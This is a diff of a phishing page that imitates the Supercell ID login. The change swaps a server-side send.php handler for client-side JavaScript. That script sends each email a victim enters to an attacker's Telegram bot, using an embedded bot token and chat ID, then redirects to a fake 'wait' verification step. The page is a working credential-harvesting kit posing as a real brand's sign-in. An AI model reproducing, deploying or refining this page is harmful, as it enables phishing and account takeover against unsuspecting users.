@@ -1,54 +1,47 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Supercell ID Login</title>
+  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome (optional) -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  
   <script>
     async function sendEmailToTelegram(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
+      const botToken = '8392434162:AAESI5nNDZwbxjwnlv5LBOeL8q2K9VERSfU'; // <-- Insert your bot token here
+      const chatId = '6307157806';     // <-- Insert your chat ID here
+      const message = `Email address: ${email}`;
       
-      // DİQQƏT: Token və Chat ID artıq burada deyil, send.php faylındadır.
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
       
       try {
-        // Məlumatı server tərəfindəki PHP faylına POST edirik
-        const response = await fetch('send.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: `email=${encodeURIComponent(email)}`
-        });
-        
-        if (response.ok) {
-            // Uğurlu cavab alsaq 'wait.html' səhifəsinə yönləndiririk
-            window.location.href = 'wait.html'; 
-        } else {
-            console.error('Server Error:', await response.text());
-            alert('Göndərmə xətası. Zəhmət olmasa send.php faylını yoxlayın.');
-        }
-
+        await fetch(url);
+        window.location.href = 'wait.html'; // Redirect page after code is sent
       } catch (error) {
-        console.error('Network Error:', error);
-        alert('Şəbəkə xətası. Yenidən cəhd edin.');
+        console.error('Error sending message to Telegram:', error);
       }
     }
   </script>
 </head>
 <body class="bg-blue-900 flex items-center justify-center min-h-screen px-4">
+  <!-- Card Container -->
   <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+    <!-- Top Section: Sign In / Verify labels and progress bar -->
     <div class="flex items-center justify-between mb-2">
       <span class="text-gray-700 font-medium">Sign In</span>
       <span class="text-gray-700 font-medium">Verify</span>
     </div>
     <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
+      <!-- Adjust the progress bar width as needed (style="width: 50%") -->
       <div class="bg-gradient-to-r from-blue-500 to-green-400 h-2.5 rounded-full" style="width: 50%;"></div>
     </div>
     
+    <!-- Logo and Title -->
     <div class="text-center mb-4">
       <img
         alt="Supercell ID logo"
@@ -59,6 +52,7 @@
       <p class="text-gray-600 text-sm">Enter your email to receive a verification code.</p>
     </div>
     
+    <!-- Form -->
     <form onsubmit="sendEmailToTelegram(event)">
       <div class="mb-4">
         <input
@@ -91,9 +85,17 @@
       </div>
     </form>
     
+    <!-- Footer Link -->
     <div class="text-center mt-4">
       <a class="text-blue-500" href="#">Want to register for Supercell ID?</a>
     </div>
   </div>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f1d806d99f574b5ebe419e3641a2a6cb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
+
 </html>
+
+
+
+
+
